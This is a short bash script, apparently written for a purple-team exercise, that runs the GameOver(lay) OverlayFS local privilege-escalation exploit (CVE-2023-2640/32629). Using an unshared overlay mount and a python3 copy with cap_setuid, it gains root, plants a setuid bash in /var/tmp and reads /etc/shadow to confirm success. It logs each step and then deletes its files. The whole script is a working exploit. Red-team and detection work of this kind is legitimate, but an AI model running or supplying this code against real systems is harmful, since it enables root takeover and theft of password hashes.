#!/bin/bash
# Purple Team A1 - Stage 1 v2: direct LPE, non-interactive (T1068 only)
# CVE-2023-2640/32629 GameOver(lay): OverlayFS + python3 cap_setuid
LOG=/tmp/purple_team_a1_runlog.txt
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_before=$(id)" >> $LOG
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) running exploit" >> $LOG

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c '
import os
os.setuid(0)
os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash")
result = os.popen("/var/tmp/bash -p -c \"id && cat /etc/shadow | head -1 && echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED\"").read()
import sys
sys.stdout.write(result)
sys.stdout.flush()
os.system("rm -rf l m u w /var/tmp/bash")
' 2>&1 | tee -a $LOG

echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_after=$(id)" >> $LOG
